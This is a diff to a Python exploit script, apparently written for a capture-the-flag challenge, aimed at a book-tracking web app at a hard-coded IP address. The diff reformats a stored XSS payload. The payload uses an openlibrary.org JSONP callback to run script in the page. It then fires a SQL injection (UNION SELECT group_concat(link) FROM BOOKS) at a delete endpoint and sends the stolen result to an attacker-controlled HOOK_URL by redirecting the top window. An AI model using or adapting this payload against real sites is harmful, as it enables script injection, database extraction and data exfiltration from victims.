@@ -1,5 +1,4 @@
 import requests
-import time
 import json
 
 HOST_URL = "http://20.193.136.145:1337"
@@ -76,8 +75,9 @@ payload = "<iframe srcdoc=\"<script src='https://openlibrary.org/api/books?bibke
 data = f'{{"title":{payload},"author":"ff","pages":4,"imageLink":"/assets/icons/bookshelf.svg","link":"","read":false,"fav":false}}'
 '''
 
-payload = f"""<iframe srcdoc=\"<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&callback=fetch(`/api/delete/?title=%22 UNION SELECT group_concat(link) FROM BOOKS--`,{
-    method:`POST`}).then((response)=>response.text()).then((response)=>(window.top.location=`{HOOK_URL}/?q=${response}`));//'></script>a\"></iframe>"""
+payload = f"""<iframe srcdoc=\"<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&callback=\
+    fetch(`/api/delete/?title=%22 UNION SELECT group_concat(link) FROM BOOKS--`,\
+    {{method:`POST`}}).then((response)=>response.text()).then((response)=>(window.top.location=`{HOOK_URL}/?q=${response}`));//'></script>a\"></iframe>"""
 
 data_dict = {
     "title": payload,
